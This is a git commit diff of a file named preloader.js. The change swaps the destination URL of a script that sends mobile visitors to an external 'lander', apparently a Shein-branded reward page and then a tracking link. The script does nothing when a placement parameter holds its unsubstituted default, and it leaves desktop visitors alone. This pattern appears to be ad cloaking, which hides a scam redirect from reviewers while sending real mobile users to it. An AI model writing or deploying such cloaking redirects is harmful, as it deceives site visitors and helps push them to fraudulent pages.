21390e9354399047252c325df96b92018f8cc7dd
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-07-24 21:12:17 -0400

    Update preloader.js

--- public/cdn/preloader.js
+++ public/cdn/preloader.js
@@ -2,7 +2,7 @@ const urlParams = new URLSearchParams(window.location.search);
 const utmXXX = urlParams.get("xxx");
 const s = urlParams.get("s");
 const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-const lander = `https://tokreward.com/shein.html?slug=${s}`;
+const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
 if (utmXXX === "__PLACEMENT__") { }
 else if (isMobileDevice) { window.location.href = lander; } 
 else { }
